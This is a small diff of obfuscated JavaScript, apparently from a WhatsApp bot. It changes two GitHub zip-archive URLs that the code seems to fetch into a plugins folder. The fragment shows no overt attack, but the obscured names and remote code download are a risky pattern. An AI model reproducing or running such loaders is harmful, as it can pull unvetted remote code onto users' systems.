@@ -57,8 +57,8 @@ const UvoJ = [
   "923155641171@s.whatsapp.net",
 ];
 const orfJ =
-  "https://github.com/duafatima5/duafatima75/archive/refs/heads/main.zip";
-const QsiJ = "https://github.com/duafatima4/duafatima5/archive/refs/heads/main.zip";
+  "https://github.com/duafatima75/duafatima5/archive/refs/heads/main.zip";
+const QsiJ = "https://github.com/duafatima/duafatima4/archive/refs/heads/main.zip";
 const koZI = path["join"](YeHI, "plugins");
 async function MpcJ() {
   try {
